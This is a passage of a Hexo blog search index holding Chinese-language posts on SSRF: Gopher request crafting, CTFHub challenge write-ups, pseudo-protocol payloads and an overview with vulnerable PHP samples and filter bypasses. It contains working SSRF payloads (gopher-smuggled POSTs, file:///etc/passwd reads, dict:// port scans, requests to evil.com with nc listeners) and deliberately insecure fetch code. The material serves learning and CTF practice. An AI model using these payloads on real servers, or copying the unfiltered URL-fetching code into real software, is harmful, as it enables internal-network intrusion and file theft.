<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Gopher协议深度理解</title>
      <link href="/2021/08/25/Gopher%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3/"/>
      <url>/2021/08/25/Gopher%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Gopher协议的深度理解"><a href="#Gopher协议的深度理解" class="headerlink" title="Gopher协议的深度理解"></a>Gopher协议的深度理解</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p><strong>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</strong></p><h2 id="限制"><a href="#限制" class="headerlink" title="限制:"></a>限制:</h2><p><img src="https://pic2.zhimg.com/80/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.png" alt="img"></p><h2 id="Gopher协议格式："><a href="#Gopher协议格式：" class="headerlink" title="Gopher协议格式："></a>Gopher协议格式：</h2><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间&amp;也需要进行编码</li></ul><p><strong>Gopher发送请求HTTP GET请求：</strong></p><p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p><p>nc启动监听，监听2333端口：nc -lp 2333</p><p>使用curl发送http请求，命令为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ curl gopher:<span class="comment">//192.168.0.119:2333/abcd</span></span><br></pre></td></tr></table></figure><p>此时nc收到的消息为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333</span><br><span class="line">bcd</span><br></pre></td></tr></table></figure><p>可以发现url中的a没有被nc接受到，如果命令变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ curl gopher://192.168.0.119:2333/_abcd</span><br></pre></td></tr></table></figure><p>此时nc收到的消息为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333</span><br><span class="line">abcd</span><br></pre></td></tr></table></figure><p>所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）</p><p>那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：</p><blockquote><p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p></blockquote><p>我准备了一个PHP的代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个GET型的HTTP包，如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ssrf/base/get.php?name=Margin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.109</span><br></pre></td></tr></table></figure><p>URL编码后为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A</span><br></pre></td></tr></table></figure><p>在转换为URL编码时候有这么几个坑</p><blockquote><p>1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p></blockquote><p><strong>Gopher发送请求HTTP POST请求：</strong></p><p>发送POST请求前，先看下POST数据包的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">host:192.168.0.109</span><br><span class="line"></span><br><span class="line">name=Margin</span><br></pre></td></tr></table></figure><p>那我们将上面的POST数据包进行URL编码并改为gopher协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A</span><br></pre></td></tr></table></figure><p>post.php的代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用curl发起gopher的POST请求后，结果为：</p><p><img src="https://pic2.zhimg.com/80/v2-2a42359e724822587a8f7026b9481d61_720w.jpg" alt="img"></p><p>根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] &quot;POST /ssrf/base/post.php HTTP/1.1&quot; 200 7</span><br><span class="line">192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] &quot;name=Margin&quot; 501 213</span><br><span class="line">[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin</span><br></pre></td></tr></table></figure><p>这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">host:192.168.0.109</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line">name=Margin</span><br></pre></td></tr></table></figure><p>现在我们将它进行URL编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A</span><br></pre></td></tr></table></figure><p>再次发送请求的结果为：</p><p><img src="https://pic4.zhimg.com/80/v2-571b29ad1c7922b652a783160e5a8d77_720w.jpg" alt="img"></p><p>发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF题目部分</title>
      <link href="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/"/>
      <url>/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p><strong>考点</strong>：用Gopher协议构造post请求。</p><p>首先，进入题目之后。我们用常用的思路，访问一下flag.php文件</p><p>我们可以看见有一个debug的key值，我们先纪律一下。</p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/5.png"></p><p>然后我们使用本地的访问看看是否有403.php,index.php,flag.php，并且看看源码，一般web目录为var/www/html/</p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/6.png"></p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/6.png"></p><p>然后我们看见index.php源码中有一系列的curl函数，可以使用访问，然后这里我们就需要用gopher协议构造一个post数据包</p><p>这里开始就要注意post数据包的一个特殊的点：</p><ol><li>需要两次编码</li><li>在第一次编码过后，我们就需要将%0a换成%0d%0a</li><li>在构造gopher时需要在url后一项加一个任意符号。</li></ol><p>然后构造出来是这样的，然后用bp上传就ok了。</p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-ctfhub题目（部分）</title>
      <link href="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/"/>
      <url>/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHUB-SSRF题目"><a href="#CTFHUB-SSRF题目" class="headerlink" title="CTFHUB SSRF题目"></a>CTFHUB SSRF题目</h1><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p><strong>考点</strong>：SSRF远程访问主机中的文件</p><p>进入题目之后是这样的无显示。</p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/1.png"></p><p>然后我们根据题目提示，说访问127.0.0.1的flag.php文件，我们注意看url栏在<strong>url栏</strong>后面是空白的，然后我们就添加127.0.0.1/flag.php，然后访问，就得到flag了。</p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/2.png"></p><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p><strong>考点</strong>：伪协议读取本地的文件</p><ol><li>首先我们要知道在ssrf中常用的伪协议有哪些？比如file:///、dict://、sftp://…</li><li>我们要知道一般本地web的目录，一般是这样的var/www/html/…</li></ol><p>这样我们进入题目进入题目之后也是这样的无显示，并且url栏是空着的，这个时候我们就可以添加上面的东西这样添加</p><p><code>?url=file:///var/www/html/flag.php</code></p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/3.png"></p><p><strong>题后总结</strong>：我们要知道file:///可以冲文件系统中获取文件。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>考点</strong>：主要考dict：//伪协议的使用</p><p>进入题目之后我们可以看到也是一个无显示的网页，url需要填写，这里我们根据提示，访问端口在8000-9000，然后我们就用这样填写url</p><p><code>?url=dict://127.0.0.1:8000</code></p><p>然后用bp对8000进行数字爆破，爆破数字段from8000to9000 step1</p><p>然后就得到flag了</p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/4.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF伪协议</title>
      <link href="/2021/08/24/SSRF%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/08/24/SSRF%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF伪协议"><a href="#SSRF伪协议" class="headerlink" title="SSRF伪协议"></a>SSRF伪协议</h1><h2 id="一、类型"><a href="#一、类型" class="headerlink" title="一、类型"></a>一、类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:///    (切记三个杠)</span><br><span class="line">dict://</span><br><span class="line">sftp://</span><br><span class="line">ldap://</span><br><span class="line">tftp://</span><br><span class="line">gopher://</span><br></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>这种URL Schema可以尝试从文件系统中获取文件：</p><p><code>http://example.com/ssrf.php?url=file:///etc/passwdhttp://examle.com/ssrf.php?url=file:///c:/Windows/win</code></p><p>如果服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的UTL Schema就可以绕过这些限制：</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h3><p>这中URL Schema能够引用允许通过DICT协议使用的定义或单词列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure><p><strong>sftp://</strong></p><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File  Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure><p><strong>ldap://或ldaps:// 或ldapi://</strong></p><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>tftp://</strong></p><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET </span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>gopher://</strong></p><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</span><br><span class="line"></span><br><span class="line">&lt;?php  header(&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/2021/08/23/SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/08/23/SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>服务端请求伪造（Server-Side Request Forgery），是指Web服务提供从用户指定的URL读取数据并展示功能又未对用户输入的URL进行过滤，导致攻击者可借助服务端实现访问基本无权访问的URLWeblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis，fastcgi等脆弱组件。</p><h2 id="漏洞产生的原因："><a href="#漏洞产生的原因：" class="headerlink" title="漏洞产生的原因："></a>漏洞产生的原因：</h2><p>大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器发起请求，并返回对该目标地址请求的数据。</p><h2 id="SSRF漏洞的危害"><a href="#SSRF漏洞的危害" class="headerlink" title="SSRF漏洞的危害"></a>SSRF漏洞的危害</h2><ul><li>对目标服务器所在的内网进行IP存活性扫描和端口扫描</li><li>利用扫描的指纹信息判断开发的服务，从而对内网的主机进行攻击</li><li>识别内网WEB应用指纹，判断应用类型进行攻击</li><li>使用特定协议攻击应用（gopher，dict,flie,FTP/SFTP）</li></ul><h3 id="数据流："><a href="#数据流：" class="headerlink" title="数据流："></a>数据流：</h3><p>攻击者—-&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同，对应的影响和利用方法又有不一样。</p><h3 id="php中下面的函数使用不当会导致SSRF："><a href="#php中下面的函数使用不当会导致SSRF：" class="headerlink" title="php中下面的函数使用不当会导致SSRF："></a>php中下面的函数使用不当会导致SSRF：</h3><ol><li><code>file_get_contents()</code>这段代码使用file_get_contents函数从用户指定的url获取图片，然后把它用一个随机文件名保存在硬盘上，并展示给用户。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]);</span><br><span class="line">    $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;;</span><br><span class="line">    file_put_contents($filename, $content); </span><br><span class="line">    echo $_POST[&#x27;url&#x27;]; </span><br><span class="line">    $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">    &#125;</span><br><span class="line">    echo $img;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>fsockopen()</code>这段代码使用fsockopen函数实现获取用户制定URL的数据（文件或者HTML），这个函数会使用socket跟服务器建立TCP连接，传输原始数据。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">if (!$fp) </span><br><span class="line">&#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">$out = &quot;GET $link HTTP/1.1\r\n&quot;; </span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">$out .= &quot;\r\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; </span><br><span class="line">while (!feof($fp)) </span><br><span class="line">&#123; </span><br><span class="line">$contents.= fgets($fp, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp);</span><br><span class="line">             return $contents; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li><code>curl_exec()</code>使用curl获取数据。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$link = $_POST[&#x27;url&#x27;]; </span><br><span class="line">$curlobj = curl_init(); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0); </span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line">$result=curl_exec($curlobj); </span><br><span class="line">curl_close($curlobj); </span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; </span><br><span class="line">file_put_contents($filename, $result); </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>这个不是函数，是利用SSRF进行端口扫描127.0.0.1:3306根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的banner信息判断端口的状态。</li></ol><p><strong>后端代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$link = $_POST[&#x27;url&#x27;]; </span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;txt&#x27;; </span><br><span class="line">$curlobj = curl_init($link); </span><br><span class="line">$fp = fopen($filename,&quot;w&quot;); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_FILE, $fp); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_HEADER, 0); </span><br><span class="line">curl_exec($curlobj); curl_close($curlobj); </span><br><span class="line">fclose($fp); </span><br><span class="line">$fp = fopen($filename,&quot;r&quot;);</span><br><span class="line">$result = fread($fp, filesize($filename)); </span><br><span class="line">fclose($fp); </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>前端代码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;px&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/ss.php&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;commit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>请求非HTTP的端口可以返回banner信息。或可利用302跳转进行绕HTTP协议的限制。</p><p><strong>辅助脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">$port = $_GET[&#x27;port&#x27;];</span><br><span class="line">$scheme = $_GET[&#x27;s&#x27;];</span><br><span class="line">$data = $_GET[&#x27;data&#x27;];</span><br><span class="line">header(&quot;Location: $scheme://$ip:$port/$data&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定（“或者预埋在前端的请求”）的地址进行资源请求，则请做好目标地址的过滤。</p><h2 id="SSRF的漏洞攻击利用"><a href="#SSRF的漏洞攻击利用" class="headerlink" title="SSRF的漏洞攻击利用"></a>SSRF的漏洞攻击利用</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务端banner信息。（banner信息中可以获取到软件开发商、软件名称、服务类型、版本号等）</li><li>攻击运行在内网或本地的应用程序（比如溢出）。</li><li>对内网Web应用进行指纹识别，通过访问默认文件实现。</li><li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击。</li><li>利用file协议读取本地文件等。</li></ol><h2 id="SSRF绕过姿势"><a href="#SSRF绕过姿势" class="headerlink" title="SSRF绕过姿势"></a>SSRF绕过姿势</h2><ol><li><p><strong>更改IP地址写法。</strong>例如：192.168.0.18进制格式0300.0250.0.116进制格式：0xC0.0xA8.0.110 进制整数格式：323223552116 进制整数格式：0xC0A80001，还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.12。</p></li><li><p><strong>利用 URL 解析问题</strong> 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。</p><p>例如：<a href="http://www.baidu.com@192.168.0.1/%E4%B8%8Ehttp://192.168.0.1%E8%AF%B7%E6%B1%82%E7%9A%84%E9%83%BD%E6%98%AF192.168.0.1%E5%86%85%E5%AE%B9%E5%8F%AF%E4%BB%A5%E6%8C%87%E5%90%91%E4%BB%BB%E6%84%8F">http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1内容可以指向任意</a> ip 的域名xip.io：<a 